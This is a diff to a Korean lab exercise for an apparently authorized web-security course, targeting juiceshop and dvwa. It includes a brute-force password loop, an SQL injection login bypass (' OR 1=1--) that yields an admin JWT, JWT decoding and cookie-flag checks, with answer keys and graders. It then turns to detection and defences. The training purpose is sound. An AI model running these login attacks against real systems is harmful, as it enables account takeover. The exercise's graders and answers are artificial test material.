@@ -4,37 +4,51 @@ version: standalone-web-vuln
 course: web-vuln
 week: 4
 description: |
-  인증/세션 점검(WSTG-ATHN/SESS) — 무차별 대입, SQLi 인증 우회→JWT, JWT 약점, 세션 쿠키 플래그.
-  juiceshop/dvwa 대상. 공격은 el34-attacker. 인가된 실습만. 명령은 el34 호스트에서.
+  인증·세션 점검(OWASP A07, WSTG-ATHN/SESS) 실습. 인증(로그인 순간)과 세션(로그인 이후 신원 유지)을
+  점검자의 손으로 두드려 본다. 무차별 대입으로 약한 PW·rate-limit 부재를 확인하고, SQL Injection 인증
+  우회(' OR 1=1--)로 비밀번호를 건너뛰어 관리자 JWT를 획득하며, 그 JWT의 payload를 base64 디코드해
+  정보 노출을 보이고, 세션 쿠키의 보호 플래그(HttpOnly/Secure/SameSite)를 점검한다. 마지막으로 같은
+  공격이 방어 스택(접근로그의 로그인 폭주 + WAF 942의 SQLi 우회)에 남기는 흔적을 찾고, 다층 인증·세션
+  방어를 정리한다. 대상은 juiceshop(JWT 기반)/dvwa(PHP 세션, 차단형). 공격은 el34-attacker에서 수행한다.
+  인가된 실습 환경(el34)에서만 수행한다. 모든 명령은 el34 호스트(ssh ccc@192.168.0.151)에서 docker exec로.
 difficulty: hard
 duration_minutes: 170
 prerequisites:
-  - "W01–W03 통과"
-  - "el34 호스트 SSH + docker exec"
-  - "lecture §2(인증공격) §3(JWT) §4(세션) 숙지"
+  - "W01–W03 통과 (수동 HTTP 점검·자동 스캐너·정보수집)"
+  - "el34 호스트 SSH 접속 + docker exec 사용법 숙지"
+  - "lecture §2(인증 4공격: 무차별/스터핑/SQLi 우회/기본계정) §3(JWT 구조·약점) §4(세션 쿠키·고정) 숙지"
 objectives:
-  - "무차별 대입 + SQLi 인증 우회로 JWT 획득"
-  - "JWT payload 분석 + 세션 쿠키 플래그 점검"
-  - "인증/세션 방어"
+  - "무차별 대입으로 약한 PW·rate-limit 부재를 판정하고, SQLi 인증 우회(' OR 1=1--)로 PW 없이 관리자 JWT 획득"
+  - "JWT payload를 base64 디코드해 정보 노출을 입증하고, 세션 쿠키의 HttpOnly/Secure/SameSite 플래그 점검"
+  - "로그인 남용·SQLi 우회의 방어 흔적(접근로그/WAF 942)을 찾고, 다층 인증·세션 방어(rate-limit·MFA·parameterized query·JWT 검증·쿠키 플래그)를 정리"
 pass_threshold: 0.7
 steps:
 
   - order: 1
     instruction: |
-      ## 🎯 점검 — 로그인 API
+      ## 🎯 목표
+      인증 점검의 출발점 — juiceshop 로그인 API가 살아 있는지, 어떤 방식(JWT 발급)인지 확인한다.
+      ## 개념 한 줄
+      점검자는 본격 공격 전에 항상 대상의 동작부터 본다. 잘못된 자격증명에 어떤 응답이 오는지가
+      인증이 정상 동작 중인지를 알려주는 첫 신호다(WSTG-ATHN).
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'login=%{http_code}\n' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"x\",\"password\":\"x\"}' http://10.20.30.1/rest/user/login"
       ```
       ## ✅ 합격 기준
-      로그인 API 응답을 확인한다.
+      로그인 API가 응답하고 `login=<코드>`가 출력된다. 잘못된 자격증명에 401이면 인증이 정상 동작 중.
+      ## 🧰 옵션 풀이
+      - `curl -s`: 진행률 표시를 숨김(조용히). `-o /dev/null`: 응답 본문을 버림(코드만 볼 때).
+      - `-w 'login=%{http_code}\n'`: 응답 후 HTTP 상태 코드만 출력하는 포맷.
+      - `-X POST` + `-d '{...}'`: 로그인은 POST로 JSON 자격증명을 전송. `-H 'Host: juice.el34.lab'`로
+        web Apache가 juiceshop vhost로 라우팅하게 한다.
     hint: 'login API'
     category: survey
     points: 10
     answer: |
       docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'login=%{http_code}\n' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"x\",\"password\":\"x\"}' http://10.20.30.1/rest/user/login"
       echo "→ 401=실패(정상). 인증 점검 대상"
-    answer_detail: "인증 점검 대상 = juiceshop 로그인 API(JWT 발급). 정상 실패는 401."
+    answer_detail: "인증 점검의 첫 단계 = 대상 로그인 API 동작 확인. juiceshop /rest/user/login은 성공 시 JWT를 발급하는 인증 엔드포인트다. 잘못된 자격증명(email/password=x)에 401(Unauthorized)이 떨어지면 인증이 정상 동작 중이라는 뜻 — 이것이 정상이며 이후 공격의 기준선이 된다. 채점은 stdout에 'login='이 보이는지로 판정한다."
     verify:
       type: output_contains
       expect: 'login='
@@ -47,13 +61,22 @@ steps:
 
   - order: 2
     instruction: |
-      ## 🎯 무차별 대입
+      ## 🎯 목표
+      관리자 계정에 약한 비밀번호 목록을 반복 시도해, rate-limit/lockout 의 유무와 약한 PW의 위험을
+      직접 체감한다.
+      ## 개념 한 줄
+      무차별 대입(brute force)은 가능한 비밀번호를 사전·조합으로 반복 시도하는 가장 기본적인 인증
+      공격이다. 시도 횟수 제한(rate-limit)이 없으면 약한 PW는 순식간에 뚫린다.
       ## 💻 실행 명령
       ```bash
       for p in admin 123456 password admin123; do docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'pw=$p:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"'$p'\"}' http://10.20.30.1/rest/user/login"; done; echo
       ```
       ## ✅ 합격 기준
-      무차별 대입(여러 PW 시도)을 수행한다.
+      약한 PW 목록을 반복 시도하고 각 결과가 `pw=<PW>:<코드>`로 출력된다. 200=성공(약한 PW), 401=실패.
+      ## 🧰 옵션 풀이
+      - `for p in ...; do ...; done`: 셸 반복문 — 약한 PW 목록(admin/123456/password/admin123)을 차례로
+        대입한다. rate-limit이 없으면 이 반복이 막히지 않고 끝까지 돈다는 점이 핵심 관찰이다.
+      - email은 juiceshop 관리자(`admin@juice-sh.op`)로 고정하고 password만 바꿔 가며 시도한다.
     hint: '여러 PW 로그인 시도'
     category: manipulation
     points: 12
@@ -61,7 +84,7 @@ steps:
       echo "=== 무차별 대입 (약한 PW) ==="
       for p in admin 123456 password admin123; do docker exec el34-attacker sh -c "curl -s -o /dev/null -w 'pw=$p:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"'$p'\"}' http://10.20.30.1/rest/user/login"; done; echo
       echo "→ 200=성공(약한 PW), 401=실패. rate-limit 없으면 무차별 대입 가능"
-    answer_detail: "무차별 대입 = 약한 PW를 사전으로 시도. rate-limit/lockout 없으면 가능. 200이 나오면 약한 PW."
+    answer_detail: "무차별 대입(brute force) = 약한 PW를 사전으로 반복 시도하는 가장 단순한 인증 공격. 성공 조건은 두 가지 — 약한 PW + rate-limit/lockout 부재. 응답 200은 약한 PW를 맞힌 성공, 401은 실패다. 핵심 관찰은 rate-limit이 없으면 반복이 막히지 않는다는 것 — 이것이 미션 6(탐지)에서 접근로그의 로그인 폭주로 드러난다. 채점은 stdout에 'pw=admin'이 보이는지(첫 시도가 수행됐는지)로 판정한다."
     verify:
       type: output_contains
       expect: 'pw=admin'
@@ -74,14 +97,26 @@ steps:
 
   - order: 3
     instruction: |
-      ## 🎯 SQLi 인증 우회 → JWT
+      ## 🎯 목표
+      비밀번호를 맞히는 게 아니라 **건너뛴다**. SQL Injection으로 로그인 조건을 항상 참으로 만들어,
+      비밀번호 없이 관리자 JWT를 획득한다.
+      ## 개념 한 줄
+      SQLi 인증 우회는 email 자리에 `' OR 1=1--`를 넣어, 로그인 쿼리를 `... WHERE email='' OR 1=1--`
+      로 조작한다. `OR 1=1`이 조건을 무조건 참으로 만들고 `--`가 비밀번호 검사를 주석 처리해, DB가 첫
+      사용자(관리자)를 반환 → 앱이 관리자 JWT를 발급한다. (데이터를 빼내는 Union/Blind SQLi와 sqlmap은 W05.)
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv4.json'
-      docker exec el34-attacker sh -c "curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d @/tmp/wv4.json http://10.20.30.1/rest/user/login | head -c 100; rm -f /tmp/wv4.json"
+      docker exec el34-attacker sh -c "curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d @/tmp/wv4.json http://10.20.30.1/rest/user/login | head -c 120; rm -f /tmp/wv4.json"
+      echo ""
       ```
       ## ✅ 합격 기준
-      SQLi 인증 우회로 JWT를 획득한다.
+      응답에 인증 토큰(`authentication`/`token` 필드)이 보이면 우회 성공 — 비밀번호 없이 로그인됨.
+      ## 🧰 옵션 풀이
+      - base64 한 단계: 페이로드 JSON `{"email":"' OR 1=1--","password":"x"}`에는 셸과 충돌하는 따옴표가
+        많아, base64로 인코딩한 문자열을 컨테이너 안에서 `base64 -d`로 풀어 파일(`/tmp/wv4.json`)에 쓴다.
+      - `-d @/tmp/wv4.json`: `@`는 "이 파일의 내용을 본문으로 전송"이라는 curl 표기. 마지막에 `rm -f`로
+        임시 파일을 정리한다.
     hint: "' OR 1=1-- → token"
     category: manipulation
     points: 14
@@ -91,7 +126,7 @@ steps:
       docker exec el34-attacker sh -c "curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d @/tmp/wv4.json http://10.20.30.1/rest/user/login | head -c 120; rm -f /tmp/wv4.json"
       echo ""
       echo "→ ' OR 1=1-- → admin JWT 획득 = 인증 우회(rate-limit/PW와 무관)"
-    answer_detail: "SQLi 인증 우회 = PW 무관 로그인. ' OR 1=1--가 쿼리를 참으로 → admin JWT. 무차별 대입보다 강력."
+    answer_detail: "SQLi 인증 우회 = 비밀번호를 푸는 게 아니라 검사 로직 자체를 무력화하는 공격. 안전하지 않은 로그인 쿼리(SELECT ... WHERE email='입력' AND password='입력')의 email 자리에 ' OR 1=1--를 넣으면, 따옴표가 닫히고 OR 1=1(항상 참)이 끼어들며 -- 뒤(PW 검사)가 주석 처리되어 사라진다 → DB가 첫 사용자(관리자)를 반환 → 관리자 JWT 발급. 무차별 대입과 달리 비밀번호가 강하든 rate-limit이 있든 통하므로 훨씬 강력하다. 차단형 dvwa였다면 같은 페이로드가 WAF 942 룰군에 걸려 403으로 막힌다. 채점은 stdout에 'authentication'(토큰 응답 필드)이 보이는지로 판정한다."
     verify:
       type: output_contains
       expect: 'authentication'
@@ -104,15 +139,25 @@ steps:
 
   - order: 4
     instruction: |
-      ## 🎯 JWT 분석
+      ## 🎯 목표
+      앞서 받은 JWT가 신원을 어떻게 담는지 들여다봐, "payload는 암호화가 아니다"라는 JWT의 핵심
+      오해를 깬다 — 누구나 디코드해 안을 읽을 수 있다.
+      ## 개념 한 줄
+      JWT는 점(.)으로 나뉜 세 칸(header.payload.signature)이고 각 칸은 base64url 인코딩일 뿐 암호화가
+      아니다. 가운데 칸(payload)만 디코드하면 email·권한 같은 정보가 평문으로 노출된다(WSTG-SESS).
       ## 💻 실행 명령
       ```bash
       docker exec el34-attacker sh -c 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv4.json
       T=$(curl -s -H "Host: juice.el34.lab" -H "Content-Type: application/json" -d @/tmp/wv4.json http://10.20.30.1/rest/user/login | sed -E "s/.*\"token\":\"([^\"]+)\".*/\1/")
-      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 200; rm -f /tmp/wv4.json'
+      echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 250; rm -f /tmp/wv4.json'
+      echo ""
       ```
       ## ✅ 합격 기준
-      JWT payload에서 사용자 정보(email)가 노출됨을 확인한다.
+      디코드 결과에 사용자 정보(예: `email`)가 평문으로 보인다 = payload가 누구나 읽힌다는 증거.
+      ## 🧰 옵션 풀이
+      - `cut -d. -f2`: 점(.)을 구분자로 토큰의 **두 번째 칸(payload)** 만 잘라낸다.
+      - `tr "_-" "/+"`: JWT는 base64url(`-`,`_`)을 쓰므로 표준 base64(`/`,`+`) 문자로 치환해야 디코드된다.
+      - `base64 -d`: 치환된 payload를 평문 JSON으로 디코드. `sed -E`는 응답에서 token 값만 추출한다.
     hint: 'JWT payload 디코드'
     category: analysis
     points: 12
@@ -123,7 +168,7 @@ steps:
       echo "$T" | cut -d. -f2 | tr "_-" "/+" | base64 -d 2>/dev/null | head -c 250; rm -f /tmp/wv4.json'
       echo ""
       echo "→ payload는 base64라 누구나 디코드 → email/권한 노출. 민감정보 담으면 안 됨"
-    answer_detail: "JWT 분석 = payload base64 디코드(서명 검증 없이 내용 노출). email/role 노출. 약점: alg:none/약한키/만료 미검증."
+    answer_detail: "JWT 분석 = 가운데 칸(payload)을 base64url 디코드하면 서명 검증 없이도 내용(email·role 등)이 평문으로 노출된다. 핵심 오해 깨기 — payload는 암호화가 아니라 단지 인코딩이므로 토큰만 있으면 누구나 읽는다. 따라서 첫 번째 점검 결론은 'payload에 민감정보를 담으면 안 된다'. 나머지 JWT 약점은 alg:none(서명 없음으로 위조), 약한 서명키(키 추측 → 위조), 만료/서명 미검증(만료·위조 토큰 통과)이며, 방어는 강한 키 + 알고리즘 고정(none 거부) + 엄격 검증이다. 채점은 stdout에 'email'이 보이는지로 판정한다."
     verify:
       type: output_contains
       expect: 'email'
@@ -136,13 +181,21 @@ steps:
 
   - order: 5
     instruction: |
-      ## 🎯 세션 쿠키 점검
+      ## 🎯 목표
+      로그인 이후의 신원(세션)을 지키는 쿠키 보호 플래그를 점검해, 세션 탈취 위험을 판정한다.
+      ## 개념 한 줄
+      전통적 웹앱은 세션 ID를 쿠키(예: PHPSESSID)에 담는다. 그 쿠키에 HttpOnly(JS 읽기 차단)·
+      Secure(HTTPS만)·SameSite(CSRF 완화) 플래그가 없으면 세션이 탈취·도용될 수 있다(WSTG-SESS).
       ## 💻 실행 명령
       ```bash
-      docker exec el34-attacker sh -c "curl -sI -H 'Host: dvwa.el34.lab' http://10.20.30.1/ | grep -i 'set-cookie' || echo 'set-cookie 없음(JWT 기반)'"
+      docker exec el34-attacker sh -c "curl -sI -H 'Host: dvwa.el34.lab' http://10.20.30.1/ | grep -i 'set-cookie' || echo 'set-cookie 없음(juice는 JWT 기반)'"
       ```
       ## ✅ 합격 기준
-      세션 쿠키 플래그(HttpOnly/Secure)를 점검한다.
+      `Set-Cookie` 헤더에서 세션 쿠키(PHPSESSID)와 그 플래그 유무를 확인한다. 플래그 누락은 지적 사항.
+      ## 🧰 옵션 풀이
+      - `curl -sI`: `-I`는 헤더만 요청(HEAD) — 본문 없이 응답 헤더(`Set-Cookie` 포함)만 본다.
+      - `grep -i 'set-cookie'`: 대소문자 무시하고 쿠키 발급 헤더만 추린다.
+      - `|| echo ...`: 쿠키가 없으면(예: 토큰 기반 앱) 안내 문구를 출력 — 이때는 토큰 보관 방식으로 관점 전환.
     hint: 'set-cookie HttpOnly/Secure'
     category: analysis
     points: 12
@@ -150,7 +203,7 @@ steps:
       echo "=== 세션 쿠키 플래그 점검 ==="
       docker exec el34-attacker sh -c "curl -sI -H 'Host: dvwa.el34.lab' http://10.20.30.1/ | grep -i 'set-cookie' || echo 'set-cookie 없음(juice는 JWT 기반)'"
       echo "→ HttpOnly(JS 차단)/Secure(HTTPS)/SameSite(CSRF) 플래그 점검. 누락 시 세션 탈취 위험"
-    answer_detail: "세션 쿠키 = HttpOnly(XSS로 탈취 차단)/Secure(HTTPS만)/SameSite(CSRF). 누락은 세션 탈취/고정 위험. JWT 기반은 쿠키 대신 토큰 보관 방식 점검."
+    answer_detail: "세션 쿠키 점검 = 세션 ID를 담는 쿠키(PHPSESSID 등)의 세 보호 플래그를 확인한다. HttpOnly(JS의 document.cookie 읽기 차단 → XSS 탈취 방어), Secure(HTTPS에서만 전송 → 평문 도청 방어), SameSite(타 사이트발 요청에 미전송 → CSRF 완화). 셋 중 누락은 각각 세션 탈취/도청/CSRF 위험으로 이어지는 지적 사항이다. juiceshop처럼 세션을 쿠키가 아니라 JWT로 들고 다니는 앱은 Set-Cookie가 없을 수 있고, 그때는 '토큰을 어디에 어떻게 보관하나(localStorage는 XSS에 취약 등)'로 같은 질문을 던진다. 추가로 세션 고정 방어(로그인 시 세션 ID 재발급)도 점검 항목이다. 채점은 stdout에 'PHPSESSID'가 보이는지로 판정한다."
     verify:
       type: output_contains
       expect: 'PHPSESSID'
@@ -163,13 +216,22 @@ steps:
 
   - order: 6
     instruction: |
-      ## 🎯 탐지 — 로그인 남용
+      ## 🎯 목표
+      방어자의 시선으로 돌아서서, 앞서 수행한 무차별 대입이 방어 스택에 어떻게 보이는지 확인한다 —
+      좋은 점검자는 자기 행위의 가시성을 안다.
+      ## 개념 한 줄
+      무차별 대입은 짧은 시간에 같은 엔드포인트(/rest/user/login)로 다수 요청이 쏟아지므로, web의
+      접근로그에서 rate(빈도) 기반으로 탐지된다. SQLi 우회는 별도로 WAF 942 룰군에 잡힌다.
       ## 💻 실행 명령
       ```bash
-      docker exec el34-web sh -c 'sudo tail -100 /var/log/apache2/*access.log 2>/dev/null | grep -aE "rest/user/login" | tail -5 || echo "(login 요청 흔적)"'
+      docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/juice_access.log 2>/dev/null | grep -aE "rest/user/login" | tail -6 || sudo tail -60 /var/log/apache2/access.log | grep -a login | tail -5'
       ```
       ## ✅ 합격 기준
-      로그인 남용(다수 요청)이 로그에 남음을 확인한다.
+      접근로그에 `/rest/user/login` 다수 요청(=무차별 대입 신호)이 보인다.
+      ## 🧰 옵션 풀이
+      - `sudo tail -150 .../juice_access.log`: juice vhost 전용 접근로그의 최근 줄을 읽는다(권한상 sudo).
+      - `grep -aE "rest/user/login"`: 로그인 요청 줄만 추린다(`-a`는 바이너리 의심 줄도 텍스트로 처리).
+      - `|| sudo tail -60 .../access.log ...`: vhost별 로그가 없으면 통합 access.log로 대체(fallback).
     hint: 'access.log login 요청'
     category: analysis
     points: 12
@@ -177,7 +239,7 @@ steps:
       echo "=== 로그인 남용 탐지 ==="
       docker exec el34-web sh -c 'sudo tail -150 /var/log/apache2/juice_access.log 2>/dev/null | grep -aE "rest/user/login" | tail -6 || sudo tail -60 /var/log/apache2/access.log | grep -a login | tail -5'
       echo "→ 짧은 시간 다수 로그인 요청 = 무차별 대입 신호. SQLi 우회는 WAF 942"
-    answer_detail: "로그인 남용 탐지 = access.log의 /rest/user/login 다수 요청(무차별 대입) + WAF 942(SQLi 우회). rate 기반 탐지."
+    answer_detail: "로그인 남용 탐지 = 무차별 대입이 남기는 흔적을 방어자 관점으로 찾는 단계. 짧은 시간에 같은 엔드포인트(/rest/user/login)로 다수 요청이 쌓이므로 접근로그에서 rate(빈도) 기반으로 식별된다. SQLi 인증 우회는 페이로드가 SQL 문법이라 별도로 WAF 942 룰군에 잡힌다. 두 흔적 모두 같은 출처 IP(el34는 SNAT를 안 해 10.20.30.202가 보존됨)를 가리켜 한 점검자의 한 인증 공격으로 묶을 수 있다. 채점은 stdout에 'login'이 보이는지로 판정한다."
     verify:
       type: output_contains
       expect: 'login'
@@ -190,13 +252,24 @@ steps:
 
   - order: 7
     instruction: |
-      ## 🎯 방어 — 강한 인증 + 세션
+      ## 🎯 목표
+      점검의 마무리 — 공격 갈래마다 짝지어진 인증·세션 방어를 다층으로 정리한다.
+      ## 개념 한 줄
+      인증·세션은 단일 대책으로 막히지 않는다. 무차별/스터핑은 rate-limit·MFA, SQLi 우회는 parameterized
+      query, 토큰은 JWT 엄격 검증, 세션은 쿠키 플래그·재발급 — 여러 층이 함께여야 한 갈래가 뚫려도 버틴다.
       ## 💻 실행 명령
       ```bash
-      echo "방어: 강한 PW+rate-limit+MFA, parameterized query(SQLi차단), JWT 강한키/alg고정/검증, 쿠키 HttpOnly/Secure/SameSite+세션 재발급"
+      echo "=== 인증/세션 방어 ==="
+      echo "인증: 강한 PW 정책 + rate-limit/lockout + MFA, 기본 계정 제거"
+      echo "SQLi 우회 차단: parameterized query"
+      echo "JWT: 강한 서명키, alg 고정, 만료/서명 엄격 검증, 민감정보 미포함"
+      echo "세션: 쿠키 HttpOnly/Secure/SameSite, 로그인 시 세션 재발급(고정 방지), 적절한 만료"
       ```
       ## ✅ 합격 기준
-      인증/세션 방어를 정리한다.
+      각 위협(무차별/SQLi/JWT/세션)에 근본+보조 방어가 짝지어져 정리된다.
+      ## 🧰 옵션 풀이
+      - parameterized query(prepared statement): 입력을 SQL 문자열에 붙이지 않고 placeholder에 데이터로만
+        바인딩 → ' OR 1=1--가 문법이 아닌 값으로 취급되어 우회 불가. SQLi의 근본 방어(WAF는 보조).
     hint: 'rate-limit+MFA+JWT검증+쿠키플래그'
     category: report
     points: 10
@@ -206,7 +279,7 @@ steps:
       echo "SQLi 우회 차단: parameterized query"
       echo "JWT: 강한 서명키, alg 고정, 만료/서명 엄격 검증, 민감정보 미포함"
       echo "세션: 쿠키 HttpOnly/Secure/SameSite, 로그인 시 세션 재발급(고정 방지), 적절한 만료"
-    answer_detail: "인증/세션 방어 = rate-limit/MFA + parameterized query + JWT 엄격 검증 + 쿠키 플래그/세션 재발급."
+    answer_detail: "인증/세션 방어 = 위협별로 근본+보조를 짝지은 다층 방어. 무차별/스터핑 → rate-limit·lockout(근본) + 강한 PW·MFA·유출 PW 차단(보조); SQLi 우회 → parameterized query(근본) + 입력검증·최소권한 DB·WAF(보조); 기본 계정 → 출고 기본 계정 제거; JWT 위조·노출 → 강한 키·알고리즘 고정(none 거부)·만료/서명 엄격 검증(근본) + payload 민감정보 미포함; 세션 탈취 → 쿠키 HttpOnly/Secure/SameSite; 세션 고정 → 로그인 시 세션 ID 재발급. 핵심 메시지는 '비밀번호를 어렵게'로 끝나지 않는다는 것. 채점은 stdout에 'MFA'가 보이는지로 판정한다."
     verify:
       type: output_contains
       expect: 'MFA'
@@ -219,7 +292,12 @@ steps:
 
   - order: 8
     instruction: |
-      ## 🎯 인증 점검 보고서
+      ## 🎯 목표
+      미션 1–7을 인증·세션 점검 보고서로 종합한다. 점검은 발견을 영향·권고와 함께 문서로 입증할 때
+      비로소 끝난다.
+      ## 개념 한 줄
+      점검 보고서의 표준 구조는 발견(무엇을 찾았나) → 영향(왜 위험한가) → 권고(어떻게 고치나)다.
+      개별 발견을 나열만 하지 말고, A07(인증 실패)이라는 한 줄로 꿰어 결론을 낸다.
       ## 💻 보고서 양식
       ```markdown
       # 웹취약점 W04 인증/세션 보고서 (학번, 이름)
@@ -229,7 +307,10 @@ steps:
       ## 4. 방어
       ```
       ## ✅ 합격 기준
-      보고서에 인증 공격 + 방어가 포함된다.
+      보고서에 인증 공격(무차별/SQLi/JWT/세션)과 방어가 모두 포함된다.
+      ## 🧰 작성 팁
+      - 각 발견에 '영향'과 '권고'를 한 줄씩 붙인다(예: SQLi 우회 → 관리자 탈취 → parameterized query).
+      - 결론에 'SQLi 우회가 PW·rate-limit과 무관해 가장 강력 → 다층 방어 필수'라는 핵심 판단을 적는다.
     hint: '무차별+SQLi+JWT+세션'
     category: report
     points: 10
@@ -242,7 +323,7 @@ steps:
       ## 4. 방어: rate-limit/MFA + parameterized query + JWT 검증 + 쿠키 플래그/세션 재발급
       ## 결론: 인증은 A07 단골. SQLi 우회가 PW 무관 강력. 다층 인증 방어 필요
       EOF
-    answer_detail: "인증/세션 = 무차별/SQLi/JWT/세션 점검. SQLi 우회가 가장 강력. 방어는 다층."
+    answer_detail: "인증·세션 종합 보고 = 무차별 대입·SQLi 인증 우회·JWT 약점·세션 쿠키 점검을 발견→영향→권고 구조로 묶는다(WSTG-ATHN/SESS, OWASP A07). 핵심 결론은 인증이 A07 단골이며 SQLi 우회가 비밀번호·rate-limit과 무관해 가장 강력하므로, rate-limit·MFA·parameterized query·JWT 엄격 검증·쿠키 플래그/세션 재발급의 다층 방어가 필수라는 것. 채점은 stdout에 'JWT'가 보이는지로 판정한다."
     verify:
       type: output_contains
       expect: 'JWT'
